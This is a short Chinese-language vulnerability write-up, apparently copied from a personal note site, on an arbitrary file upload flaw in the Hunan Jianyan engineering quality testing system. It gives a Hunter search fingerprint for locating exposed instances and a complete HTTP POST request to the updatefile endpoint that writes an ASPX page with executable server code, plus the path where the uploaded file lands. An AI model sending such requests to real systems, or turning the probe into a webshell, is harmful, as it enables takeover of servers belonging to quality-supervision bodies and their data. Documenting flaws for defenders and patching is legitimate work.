# 湖南建研工程质量检测系统updatefile存在任意文件上传漏洞

# 一、漏洞简介
湖南建研质量监测系统由相关政府质量监督机构、参建单位等共同参与，根据各自的职责，上网操作相应的模块，实现工程质量监督业务的统一管理。该系统存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 湖南建研工程质量检测系统

# 三、资产测绘
+ hunter`web.body="/Content/Theme/Standard/webSite/login.css"`
+ 特征

![1702346060563-9e664378-c6d3-46b6-84b3-8d0043c714cd.png](./img/pyW4NN9yooREmsku/1702346060563-9e664378-c6d3-46b6-84b3-8d0043c714cd-565576.png)

# 四、漏洞复现
```plain
POST /Scripts/admintool?type=updatefile HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:92.0) Gecko/20100101 Firefox/92.0
Content-Length: 90
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

filePath=enelxghy.aspx&fileContent=<%@ Page Language="C#"%><% Response.Write(1234*1234);%>
```

![1702348378974-0d318381-620c-41aa-b97a-1b4f19878845.png](./img/pyW4NN9yooREmsku/1702348378974-0d318381-620c-41aa-b97a-1b4f19878845-910772.png)

上传文件位置

```plain
/Scripts/enelxghy.aspx
```

![1702348240471-b1fcadb7-dc80-40f8-8d01-7537daaeabb5.png](./img/pyW4NN9yooREmsku/1702348240471-b1fcadb7-dc80-40f8-8d01-7537daaeabb5-361653.png)



> 更新: 2024-02-29 23:55:43  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/vltdwq5lzwibm1z7>